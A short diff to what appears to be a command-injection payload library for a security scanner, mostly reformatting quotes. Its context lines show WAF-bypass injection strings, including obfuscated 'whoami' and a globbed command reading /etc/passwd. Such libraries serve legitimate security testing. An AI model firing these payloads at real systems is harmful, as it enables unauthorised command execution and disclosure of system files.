@@ -1,6 +1,7 @@
 """
 CMDi payload library — P2 upgrade: 80+ payloads, Linux + Windows.
 """
+
 from typing import List
 
 ECHO_PAYLOADS_LINUX: List[str] = [
@@ -67,8 +68,8 @@ WAF_BYPASS_PAYLOADS: List[str] = [
     "; $(printf '%s%s' wh oami)",
     "; /???/c?t /???/p?sswd",
     "; ec`echo h`o {token}",
-    "; e\"c\"h\"o {token}",
-    "| e\"c\"h\"o {token}",
+    '; e"c"h"o {token}',
+    '| e"c"h"o {token}',
     "; e\\c\\h\\o {token}",
     "; e''c''h''o {token}",
     "$(echo {token})",
